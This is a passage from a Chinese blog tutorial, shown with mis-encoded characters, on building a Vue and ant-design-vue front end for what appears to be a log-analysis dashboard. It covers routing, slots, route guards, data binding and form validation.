class="attr">path</span>:<span class="string">&#x27;/upload&#x27;</span>,<span class="attr">component</span>:upload&#125;,</span><br><span class="line">    &#123;<span class="attr">path</span>:<span class="string">&#x27;/login&#x27;</span>,<span class="attr">component</span>:login&#125;,</span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªVueæ–‡ä»¶çš„æ ¼å¼å¦‚ä¸‹ï¼š</p>
<h2 id="4-ä¸»å…¥å£"><a href="#4-ä¸»å…¥å£" class="headerlink" title="4.ä¸»å…¥å£"></a>4.ä¸»å…¥å£</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;app&quot;&gt; </span><br><span class="line">      &lt;router-view&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;App&#39;,</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åœ¨templateå½“ä¸­æ„é€ HTMLçš„ä»£ç ï¼Œscriptå½“ä¸­æ„é€ å½“å‰é¡µé¢çš„JSï¼Œè€Œstyleè®¾ç½®ä¸­å†™cssã€‚å¦‚æœä¸åšé™å®šï¼ŒCSSå°†ä¼šæ˜¯å…¨å±€ç”Ÿæ•ˆçš„ï¼</p>
<p>è€ŒAPPä½œä¸ºä¸»é¡µé¢ï¼Œåªéœ€è¦å†™ä¸€å¥è¯å³å¯ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-view</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€å¥è¯çš„æ„æ€ä»£ç å°†é¡µé¢å†…å®¹æ‰˜ç®¡ç»™Vueï¼Œæ ¹æ®vueçš„Routeræ¥æ˜¾ç¤ºå†…å®¹ </p>
<p>è€ŒRouterçš„è®¾ç½®åœ¨main.jså½“ä¸­ï¼ˆå®é™…ä¸Šï¼Œå‡ ä¹æ‰€æœ‰çš„è®¾ç½®éƒ½æ”¾åœ¨main.jså½“ä¸­è¿›è¡Œç»Ÿä¸€è®¾ç½®ï¼‰</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  router,</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App),</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>åœ¨main.jså¯¼å…¥çš„æ¨¡å—å¯ä»¥å…¨é¡¹ç›®ç”Ÿæ•ˆï¼Œå¦‚æœæƒ³è¦æ™®é€šçš„ç”Ÿæ•ˆä¸€ä¸ªæ¨¡å—ï¼Œè¿™æ ·æ„é€ ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Button, Table, Menu, Switch,Icon,Layout,Upload,Breadcrumb,FormModel,Input,Divider,message,Form,Alert,Spin,Modal  &#125; <span class="keyword">from</span> <span class="string">&#x27;ant-design-vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åœ¨ä¸‹é¢ï¼š</span></span><br><span class="line">Vue.use(Modal)</span><br><span class="line">Vue.use(Spin)</span><br><span class="line">Vue.use(Alert)</span><br><span class="line">Vue.use(Form)</span><br><span class="line">Vue.use(axios)</span><br><span class="line">Vue.use(htmlToPdf)</span><br><span class="line">Vue.use(Divider)</span><br><span class="line">Vue.use(Input)</span><br><span class="line">Vue.use(FormModel)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæƒ³è¦ä¿®æ”¹Vueé»˜è®¤çš„è®¾ç½®ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯¼å…¥axiosçš„æ—¶å€™è¿™æ ·æ„é€ ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line">Vue.prototype.$http = axios</span><br></pre></td></tr></table></figure>

<p>ä¹‹åæˆ‘æ„é€ äº†ä¸€ä¸ªå…¬å…±ä½¿ç”¨çš„Vueæ¨¡æ¿ï¼Œä¹Ÿå°±æ˜¯èœå•æ çš„æ’ä»¶ï¼Œæˆ‘æ˜¯åˆ›å»ºäº†ä¸€ä¸ªcommonsæ–‡ä»¶å¤¹ï¼Œå¹¶å†™åœ¨é‡Œé¢</p>
<h2 id="5-æ’æ§½"><a href="#5-æ’æ§½" class="headerlink" title="5.æ’æ§½"></a>5.æ’æ§½</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a-layout</span> <span class="attr">id</span>=<span class="string">&quot;components-layout-demo-side&quot;</span> <span class="attr">style</span>=<span class="string">&quot;min-height: 100vh&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-layout-sider</span> <span class="attr">v-model</span>=<span class="string">&quot;collapsed&quot;</span> <span class="attr">width</span>=<span class="string">&quot;12%&quot;</span> <span class="attr">collapsible</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-menu</span> <span class="attr">theme</span>=<span class="string">&quot;dark&quot;</span> <span class="attr">:default-selected-keys</span>=<span class="string">&quot;[&#x27;1&#x27;]&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;inline&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;upload&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;cloud-download&quot;</span> /&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                  æ–‡ä»¶ä¸Šä¼   </span><br><span class="line">              <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-sub-menu</span> <span class="attr">key</span>=<span class="string">&quot;sub1&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">slot</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;area-chart&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                  æ•°æ®åˆ†æ</span><br><span class="line">                <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;report&quot;</span>&gt;</span></span><br><span class="line">              æ—¥å¿—åˆ†æ</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;getpdf&quot;</span>&gt;</span></span><br><span class="line">              è·å–æŠ¥å‘Š</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-sub-menu</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-sub-menu</span> <span class="attr">key</span>=<span class="string">&quot;sub2&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">slot</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;dashboard&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>ç«‹ä½“æ•°æ®<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;attackaddress&quot;</span>&gt;</span></span><br><span class="line">              æ”»å‡»æº¯æº</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;watchlog&quot;</span>&gt;</span></span><br><span class="line">            å®æ—¶ç›‘æ§</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-sub-menu</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;9&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;setting&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;setting&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span>&gt;</span>ç³»ç»Ÿè®¾ç½®<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;10&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showModal&quot;</span>&gt;</span>        </span><br><span class="line">          <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;login&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> &gt;</span>ç™»å‡º<span class="tag">&lt;/<span class="name">span</span>&gt;</span> </span><br><span class="line">          <span class="tag">&lt;<span class="name">a-modal</span> <span class="attr">v-model</span>=<span class="string">&quot;visible&quot;</span> <span class="attr">title</span>=<span class="string">&quot;Basic Modal&quot;</span> @<span class="attr">ok</span>=<span class="string">&quot;handleOk&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>æ˜¯å¦ç¡®å®šç™»å‡ºï¼Ÿ<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-modal</span>&gt;</span>        </span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-menu</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-layout-sider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-layout</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-layout-header</span> <span class="attr">theme</span>=<span class="string">dark</span> &gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-layout-header</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- ä¸Šé¢æ˜¯åœ¨å¯¼èˆªæ æœ€é¡¶ç«¯åŠ ä¸œè¥¿ --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-layout-content</span> <span class="attr">style</span>=<span class="string">&quot;margin: 0 16px&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-layout-content</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-layout-footer</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center&quot;</span>&gt;</span></span><br><span class="line">        Ant Design Â©2018 Created by Ant UED</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-layout-footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-layout</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a-layout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨Vueå½“ä¸­ï¼Œè¿™ä¸ªç›¸å½“äºä¸€ä¸ªæ’æ§½ï¼Œä¹Ÿå°±æ˜¯ï¼Œå‘ƒï¼Œç±»ä¼¼ä¸€ä¸ªincludeå‡½æ•°ï¼Œæˆ‘ä»¬å¦‚æœæƒ³è¦æŠŠä»–å½“ä½œæ¨¡æ¿çš„è¯å°±éœ€è¦è¿™æ ·å†™ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„report.vue</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> menus <span class="keyword">from</span> <span class="string">&#x27;../commons/menu&#x27;</span></span><br><span class="line"></span><br><span class="line">&lt;menu&gt;&lt;/menu&gt;</span><br><span class="line"><span class="comment">//åœ¨ä¸‹é¢å¯¼å…¥ï¼Œä¹‹åå†htmlå½“ä¸­ä½¿ç”¨å³å¯</span></span><br><span class="line">components:&#123;</span><br><span class="line">        menus,</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<h2 id="6-è·¯ç”±å®ˆå«"><a href="#6-è·¯ç”±å®ˆå«" class="headerlink" title="6.è·¯ç”±å®ˆå«"></a>6.è·¯ç”±å®ˆå«</h2><p>æˆ‘ä»¬å‰ç«¯è‚¯å®šæ˜¯è¦é‰´æƒçš„å§ï¼Œä¸ç„¶ç”¨æˆ·å°±å¯å¯¹å‰ç«¯ä¸ºæ‰€æ¬²ä¸ºäº†ï¼Œæ•…æˆ‘ä»¬æ„é€ ä¸€ä¸ªå±€éƒ¨å®ˆå«æ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">beforeRouteEnter</span>(<span class="params">to,<span class="keyword">from</span>,next</span>)</span> &#123;</span><br><span class="line">            axios.post(<span class="string">&#x27;/report&#x27;</span>).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">              <span class="keyword">if</span> (res.data == <span class="number">0</span>) next(&#123; <span class="attr">path</span>:<span class="string">&#x27;/&#x27;</span> &#125;);</span><br><span class="line">              <span class="keyword">else</span> next();</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;,</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯ï¼Œå†è®¿é—®è¯¥è·¯ç”±ï¼Œç¦»å¼€è·¯ç”±çš„æ—¶å€™éƒ½ä¼šå…ˆè®¿é—®ä¸€æ¬¡é¡µé¢ï¼Œæˆ‘ä»¬åç«¯å†™å¥½ä»£ç ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰ç™»é™†çš„è¯ï¼Œå°±ä¼šè¿”å›åˆ°indexé¡µé¢äº†ã€‚</p>
<h2 id="7-æœŸå¾…å€¼"><a href="#7-æœŸå¾…å€¼" class="headerlink" title="7.æœŸå¾…å€¼"></a>7.æœŸå¾…å€¼</h2><p>è¿™ä¸ªç†è§£èµ·æ¥å•é å˜´è¯´è¾ƒä¸ºåƒµç¡¬ï¼Œéœ€è¦å®æˆ˜ä¸­ä½¿ç”¨æ‰å¯ä»¥é¢†æ‚Ÿçš„æ¸…æ¥šï¼Œæ¯”å¦‚æˆ‘ä»¬çš„htmlä»£ç ä¸­æ„é€ å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a-button</span> <span class="attr">type</span>=<span class="string">&quot;danger&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;margin:&#x27;-20px 0px 0px 200px&#x27;&#125;&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;ExportSavePdf(htmlTitle,nowTime)&quot;</span>&gt;</span>æŠ¥å‘Šç”Ÿæˆ<span class="tag">&lt;/<span class="name">a-button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ï¼ˆé€šè¿‡Vueæ¡†æ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨@clickçš„æ–¹æ³•æ¥å¤„ç†å„ç§äº‹ä»¶ï¼Œä¹‹åå¡«å…¥ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶å†™å…¥å‡½æ•°çš„å®å‚ï¼Œè€Œå®å‚ä¸ä¸€å®šæ˜¯ä¸€å®šå‡ºç°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å®å‚å¯èƒ½ä¼šå‡ºç°ä¸ºnullçš„æƒ…å†µï¼Œè€ŒVueä¸æƒ³å‡ºç°è¿™ç§æƒ…å†µï¼Œæ‰€ä»¥è¦æ±‚æˆ‘ä»¬å¡«å…¥é»˜è®¤å€¼ï¼Œä¹Ÿå°±æ˜¯æœŸå¾…å€¼ï¼Œå½“æˆ‘ä»¬æ²¡æœ‰å¡«å…¥å‚æ•°çš„æ—¶å€™è‡ªåŠ¨å¡«å…¥çš„å‚æ•°</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      data,</span><br><span class="line">      columns,</span><br><span class="line">      htmlTitle: <span class="string">&#x27;report&#x27;</span>,</span><br><span class="line">      keyName: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<h2 id="8-è®¾ç½®é»˜è®¤å€¼"><a href="#8-è®¾ç½®é»˜è®¤å€¼" class="headerlink" title="8.è®¾ç½®é»˜è®¤å€¼"></a>8.è®¾ç½®é»˜è®¤å€¼</h2><p>æœ‰çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½æƒ³åœ¨ç”¨æˆ·è®¿é—®ä¹‹å‰çš„æ—¶å€™ç›´æ¥è·å–æ•°æ®ï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥ç›´æ¥æ‹¿åˆ°æ•°æ®äº†ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹æ³•ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mounted() &#123;</span><br><span class="line">    <span class="comment">// this.drawChart();</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>ä»¥è¿™ç§æ–¹å¼å¡«å…¥çš„å€¼ï¼Œå½“ç”¨æˆ·è®¿é—®é¡µé¢çš„æ—¶å€™ä¾¿ä¼šè‡ªåŠ¨è¿›è¡Œè°ƒç”¨ã€‚ä¾‹å­ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.post(<span class="string">&#x27;/setting&#x27;</span>).then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.usersData(res.data);</span><br><span class="line">      <span class="comment">// location.reload()</span></span><br><span class="line">    &#125;).catch(<span class="function"><span class="params">err</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="comment">// console.log(err)</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="9-å®ç°ç›‘å¬æ•°æ®"><a href="#9-å®ç°ç›‘å¬æ•°æ®" class="headerlink" title="9.å®ç°ç›‘å¬æ•°æ®"></a>9.å®ç°ç›‘å¬æ•°æ®</h2><p>åœ¨ä¹‹å‰çš„layuiçš„æ—¶å€™ï¼Œå› ä¸ºæˆ‘ä¸ä¼šå¯¹æ•°æ®è¿›è¡Œç»‘å®šï¼Œæ‰€ä»¥å¾€å¾€é€ æˆè‡ªå·±è¦å†™å¾ˆå¤šçš„type=hidenï¼Œæˆ–è€…å¿…é¡»æ„é€ formè¡¨å•çš„æƒ…å†µï¼Œè€Œä½¿ç”¨æ¡†æ¶ä¹‹åå¯ä»¥é€šè¿‡v-modelæ“ä½œç®€å•çš„å®ç°è¿™ä¸ªæ•ˆæœï¼Œ</p>
<p>ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a-form-model-item style=<span class="string">&quot;margin: 0px 10px 0px 00px&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;selectAddress&quot;</span>&gt;</span><br><span class="line">                            &lt;a-input  type=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;logKey&quot;</span> v-model=<span class="string">&quot;attackAddressName&quot;</span>&gt;</span><br><span class="line">                                &lt;a-icon slot=<span class="string">&quot;prefix&quot;</span> type=<span class="string">&quot;lock&quot;</span> style=<span class="string">&quot;color:rgba(0,0,0,.25)&quot;</span> /&gt;</span><br><span class="line">                            &lt;/a-input&gt;</span><br><span class="line">                    &lt;/a-form-model-item&gt;</span><br><span class="line">                        </span><br><span class="line">                    </span><br><span class="line">                    &lt;a-form-model-item <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;selectButton&quot;</span>&gt;</span><br><span class="line">                      &lt;a-button</span><br><span class="line">                            type=<span class="string">&quot;primary&quot;</span></span><br><span class="line">                            html-type=<span class="string">&quot;submit&quot;</span></span><br><span class="line">                            @click=<span class="string">&quot;selectAddress($event)&quot;</span></span><br><span class="line">                        &gt;</span><br><span class="line">                            æ·»åŠ </span><br><span class="line">                        &lt;/a-button&gt;</span><br><span class="line">                    &lt;/a-form-model-item&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åœ¨JSä»£ç ä¸­ï¼š</span></span><br><span class="line">selectAddress:<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">      <span class="comment">// console.log(this.attackAddressName)</span></span><br><span class="line">      <span class="keyword">let</span> formAddress = <span class="keyword">new</span> FormData();</span><br><span class="line">      formAddress.append(<span class="string">&#x27;logname&#x27;</span>, <span class="built_in">this</span>.attackAddressName)</span><br><span class="line">      <span class="comment">// console.log(formAddress.get(&#x27;logname&#x27;))</span></span><br><span class="line">      <span class="built_in">this</span>.spinning = <span class="literal">true</span>;</span><br><span class="line">      axios.post(<span class="string">&#x27;/setting&#x27;</span>,formAddress).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> earchData =<span class="built_in">JSON</span>.parse(res.data)</span><br><span class="line">        <span class="comment">// console.log(res.data)</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">this</span>.china(earchData);</span><br><span class="line">        <span class="built_in">this</span>.spinning = <span class="literal">false</span>;</span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘å¹¶æ²¡æœ‰å†™formè¡¨å•ï¼Œè€Œæˆ‘ä¾ç„¶å¯ä»¥å®ç°æäº¤æ•°æ®ï¼Œæ˜¯å› ä¸ºä½¿ç”¨v-modelç›‘å¬ä¹‹åï¼Œè¯¥inputè¾“å…¥æ¡†çš„å†…å®¹è¢«JSå®æ—¶ç›‘æ§ç€ã€‚</p>
<h2 id="10-ç›‘å¬çš„å¦™ç”¨"><a href="#10-ç›‘å¬çš„å¦™ç”¨" class="headerlink" title="10.ç›‘å¬çš„å¦™ç”¨"></a>10.ç›‘å¬çš„å¦™ç”¨</h2><p>åˆ©ç”¨ç›‘å¬ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾çš„å®Œæˆå¯¹ä¸€äº›çœ‹èµ·æ¥å¾ˆé…·ç‚«çš„ç‰¹æ•ˆï¼Œæ¯”å¦‚ï¼Œå¦‚æœç”¨æˆ·æƒ³è¦æäº¤ç‚¹å‡»ä¸€ä¸ªæŒ‰é’®ï¼Œå°±éœ€è¦å¡«å†™å‡ ä¸ªinputæ¡†ï¼Œå¹¶ä¸”å¦‚æœæ¡†æ˜¯ç©ºçš„ï¼Œè¿˜å¯ä»¥ç»™å‡ºæç¤ºç­‰ç­‰ï¼Œè¿™é‡Œä¸¾å‡ºä¸€ä¸ªä¾‹å­ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ç”¨æˆ·ååˆ¤æ–­ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span> <span class="attr">:validate-status</span>=<span class="string">&quot;userNameError() ? &#x27;error&#x27; : &#x27;&#x27;&quot;</span> <span class="attr">:help</span>=<span class="string">&quot;userNameError() || &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-input</span></span></span><br><span class="line"><span class="tag">        <span class="attr">v-decorator</span>=<span class="string">&quot;[</span></span></span><br><span class="line"><span class="tag"><span class="string">          &#x27;userName&#x27;,</span></span></span><br><span class="line"><span class="tag"><span class="string">          &#123; rules: [&#123; required: true, message: &#x27;Please input your username!&#x27; &#125;] &#125;,</span></span></span><br><span class="line"><span class="tag"><span class="string">        ]&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">slot</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">type</span>=<span class="string">&quot;user&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:rgba(0,0,0,.25)&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-input</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¡ºä¾¿ä¸€æï¼Œ ç”¨:å¼•å·å†™å…¥çš„ä¸œè¥¿ï¼Œä¸€èˆ¬æˆ‘ä»¬æ˜¯ç”¨äºæ¡ä»¶åˆ¤æ–­ï¼Œæ¯”å¦‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°±æ˜¯åˆ©ç”¨è¿™ä¸ªå»åˆ¤æ–­userNameErrorçš„çŠ¶å†µ</p>
<p>åœ¨methodså½“ä¸­ï¼Œæˆ‘ä»¬æ„é€ å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">userNameError</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">     <span class="keyword">const</span> &#123; getFieldError, isFieldTouched &#125; = <span class="built_in">this</span>.form;</span><br><span class="line">     <span class="keyword">return</span> isFieldTouched(<span class="string">&#x27;userName&#x27;</span>) &amp;&amp; getFieldError(<span class="string">&#x27;userName&#x27;</span>);</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure>

<p>åœ¨dataå½“ä¸­ï¼š</p>
